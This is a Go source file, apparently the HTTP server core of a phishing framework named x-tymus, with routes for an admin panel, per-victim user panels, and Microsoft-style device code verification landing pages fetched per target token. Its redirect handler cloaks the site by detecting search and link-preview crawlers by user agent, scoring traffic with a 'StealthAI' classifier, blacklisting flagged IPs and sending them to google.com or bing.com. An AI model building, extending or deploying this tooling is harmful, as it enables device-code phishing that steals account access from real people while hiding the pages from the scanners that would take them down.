package core

import (
	"encoding/json"
	"net/http"
	"regexp"
	"strings"
	"time"

	"github.com/caddyserver/certmagic"
	"github.com/gorilla/mux"
	"github.com/x-tymus/x-tymus/database"
	"github.com/x-tymus/x-tymus/log"
)

type HttpServer struct {
	srv        *http.Server
	acmeTokens map[string]string
	Cfg        *Config
	Db         *database.Database
}

func NewHttpServer() (*HttpServer, error) {
	s := &HttpServer{}
	s.acmeTokens = make(map[string]string)
	// cfg must be set after creation

	r := mux.NewRouter()
	s.srv = &http.Server{
		Handler:      r,
		Addr:         ":80",
		WriteTimeout: 15 * time.Second,
		ReadTimeout:  15 * time.Second,
	}

	r.HandleFunc("/.well-known/acme-challenge/{token}", s.handleACMEChallenge).Methods("GET")
	// Blacklist admin API
	r.HandleFunc("/admin/blacklist", s.handleBlacklistList).Methods("GET")
	r.HandleFunc("/admin/blacklist", s.handleBlacklistAdd).Methods("POST")
	r.HandleFunc("/admin/blacklist", s.handleBlacklistRemove).Methods("DELETE")
	r.HandleFunc("/admin/blacklist/flush", s.handleBlacklistFlush).Methods("POST")
	// Admin panel
	r.HandleFunc("/admin/panel", s.handleAdminPanel).Methods("GET", "POST")
	// Device code landing pages
	r.HandleFunc("/dc/{token}", s.handleDCLanding).Methods("GET")
	// User panels
	r.PathPrefix("/panel/").HandlerFunc(s.handleUserPanel)

	r.PathPrefix("/").HandlerFunc(s.handleRedirect)

	return s, nil
}

// admin handlers
func (s *HttpServer) handleBlacklistList(w http.ResponseWriter, r *http.Request) {
	if GlobalBlacklist == nil {
		http.Error(w, "no blacklist", http.StatusNotFound)
		return
	}
	type entry struct {
		IP string `json:"ip"`
	}
	var out []entry
	for k := range GlobalBlacklist.ips {
		out = append(out, entry{IP: k})
	}
	b, _ := json.Marshal(out)
	w.Header().Set("Content-Type", "application/json")
	w.Write(b)
}

func (s *HttpServer) handleBlacklistAdd(w http.ResponseWriter, r *http.Request) {
	if GlobalBlacklist == nil {
		http.Error(w, "no blacklist", http.StatusNotFound)
		return
	}
	var req struct {
		IP string `json:"ip"`
	}
	dec := json.NewDecoder(r.Body)
	if err := dec.Decode(&req); err != nil || req.IP == "" {
		http.Error(w, "invalid", http.StatusBadRequest)
		return
	}
	if err := GlobalBlacklist.AddIP(req.IP); err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		return
	}
	w.WriteHeader(http.StatusNoContent)
}

func (s *HttpServer) handleBlacklistRemove(w http.ResponseWriter, r *http.Request) {
	if GlobalBlacklist == nil {
		http.Error(w, "no blacklist", http.StatusNotFound)
		return
	}
	var req struct {
		IP string `json:"ip"`
	}
	dec := json.NewDecoder(r.Body)
	if err := dec.Decode(&req); err != nil || req.IP == "" {
		http.Error(w, "invalid", http.StatusBadRequest)
		return
	}
	if err := GlobalBlacklist.RemoveIP(req.IP); err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		return
	}
	w.WriteHeader(http.StatusNoContent)
}

func (s *HttpServer) handleBlacklistFlush(w http.ResponseWriter, r *http.Request) {
	if GlobalBlacklist == nil {
		http.Error(w, "no blacklist", http.StatusNotFound)
		return
	}
	if err := GlobalBlacklist.Flush(); err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		return
	}
	w.WriteHeader(http.StatusNoContent)
}

func (s *HttpServer) Start() {
	go s.srv.ListenAndServe()
}

func (s *HttpServer) AddACMEToken(token string, keyAuth string) {
	s.acmeTokens[token] = keyAuth
}

func (s *HttpServer) ClearACMETokens() {
	s.acmeTokens = make(map[string]string)
}

func (s *HttpServer) handleACMEChallenge(w http.ResponseWriter, r *http.Request) {
	// Let certmagic's HTTP-01 solver handle it first.
	// This is required because certmagic manages challenge tokens internally
	// and cannot bind port 80 separately (already owned by this server).
	if certmagic.DefaultACME.HandleHTTPChallenge(w, r) {
		log.Debug("http: certmagic handled ACME challenge for URL: %s", r.URL.Path)
		return
	}

	// Fallback to manual token store (legacy path).
	vars := mux.Vars(r)
	token := vars["token"]

	key, ok := s.acmeTokens[token]
	if !ok {
		w.WriteHeader(http.StatusNotFound)
		return
	}

	log.Debug("http: found ACME verification token for URL: %s", r.URL.Path)
	w.WriteHeader(http.StatusOK)
	w.Header().Set("content-type", "text/plain")
	w.Write([]byte(key))
}

func (s *HttpServer) handleRedirect(w http.ResponseWriter, r *http.Request) {
	// Anti-bot: block known crawler/user-agent strings and add their IPs to the blacklist
	ua := r.UserAgent()
	uaLower := strings.ToLower(ua)
	// check configured UA regex first
	blockedByUA := false
	if s.Cfg != nil && s.Cfg.blacklistConfig != nil {
		for _, pat := range s.Cfg.blacklistConfig.UARegex {
			if pat == "" {
				continue
			}
			re, err := regexp.Compile(pat)
			if err != nil {
				log.Error("invalid UA regex pattern: %s", pat)
				continue
			}
			if re.MatchString(ua) || re.MatchString(uaLower) {
				blockedByUA = true
				break
			}
		}
	}

	knownBots := []string{"googlebot", "bingbot", "baiduspider", "yandex", "duckduckbot", "slurp", "facebookexternalhit", "twitterbot", "linkedinbot", "adsbot-google", "applebot"}
	for _, b := range knownBots {
		if strings.Contains(uaLower, b) {
			blockedByUA = true
			break
		}
	}

	if blockedByUA {
		log.Warning("Known bot detected via UA: %s IP=%s", ua, r.RemoteAddr)
		// add IP to persistent blacklist if available, but respect config whitelists/ASN
		if GlobalBlacklist != nil {
			ip := r.RemoteAddr
			// strip port if present
			if idx := strings.LastIndex(ip, ":"); idx > -1 {
				ip = ip[:idx]
			}
			if !IsIPPermitted(ip, s.Cfg) {
				if err := GlobalBlacklist.AddIP(ip); err == nil {
					log.Info("blacklist: added IP %s", ip)
				} else {
					log.Error("blacklist add failed: %v", err)
				}
			} else {
				log.Info("blacklist: skipped adding whitelisted IP %s", ip)
			}
		}
		http.Redirect(w, r, "https://www.google.com", http.StatusFound)
		return
	}

	// If not a known bot, optionally use StealthAI scoring if enabled
	if s.Cfg != nil && s.Cfg.IsStealthAIEnabled() {
		packet := r.UserAgent() + "|" + r.RemoteAddr + "|" + r.URL.String()
		score, err := AnalyzeTrafficWithStealthAI(packet)
		if err == nil {
			log.Info("StealthAI score: %f for UA: %s", score, r.UserAgent())
			if score > 0.85 {
				log.Warning("Bot detected and blocked by StealthAI: UA=%s IP=%s", r.UserAgent(), r.RemoteAddr)
				// add to blacklist
				if GlobalBlacklist != nil {
					ip := r.RemoteAddr
					if idx := strings.LastIndex(ip, ":"); idx > -1 {
						ip = ip[:idx]
					}
					if !GlobalBlacklist.IsWhitelisted(ip) {
						_ = GlobalBlacklist.AddIP(ip)
					}
				}
				http.Redirect(w, r, "https://www.google.com", http.StatusFound)
				return
			} else if score > 0.5 {
				log.Warning("Suspicious traffic redirected: UA=%s IP=%s", r.UserAgent(), r.RemoteAddr)
				http.Redirect(w, r, "https://www.bing.com", http.StatusFound)
				return
			} else {
				log.Info("Normal user allowed: UA=%s IP=%s", r.UserAgent(), r.RemoteAddr)
			}
		}
	}

	http.Redirect(w, r, "https://"+r.Host+r.URL.String(), http.StatusFound)
}

// handleDCLanding serves the Microsoft-style device code verification landing page.
func (s *HttpServer) handleDCLanding(w http.ResponseWriter, r *http.Request) {
	vars := mux.Vars(r)
	token := vars["token"]
	tgt := GetTargetByToken(token)
	if tgt == nil {
		http.NotFound(w, r)
		return
	}
	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	w.Write([]byte(DCLandingPage(tgt)))
}

// HandleRedirect returns an http.HandlerFunc that implements the same redirect logic as
// HttpServer.handleRedirect but is usable outside the core package. This allows tests
// and tools to reuse the redirect behavior by providing a Config.
func HandleRedirect(cfg *Config) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		if cfg != nil && cfg.IsStealthAIEnabled() {
			packet := r.UserAgent() + "|" + r.RemoteAddr + "|" + r.URL.String()
			score, err := AnalyzeTrafficWithStealthAI(packet)
			if err == nil {
				log.Info("StealthAI score: %f for UA: %s", score, r.UserAgent())
				if score > 0.85 {
					log.Warning("Bot detected and blocked: UA=%s IP=%s", r.UserAgent(), r.RemoteAddr)
					http.Redirect(w, r, "https://www.google.com", http.StatusFound)
					return
				} else if score > 0.5 {
					log.Warning("Suspicious traffic redirected: UA=%s IP=%s", r.UserAgent(), r.RemoteAddr)
					http.Redirect(w, r, "https://www.bing.com", http.StatusFound)
					return
				} else {
					log.Info("Normal user allowed: UA=%s IP=%s", r.UserAgent(), r.RemoteAddr)
				}
			}
		}
		http.Redirect(w, r, "https://"+r.Host+r.URL.String(), http.StatusFound)
	}
}
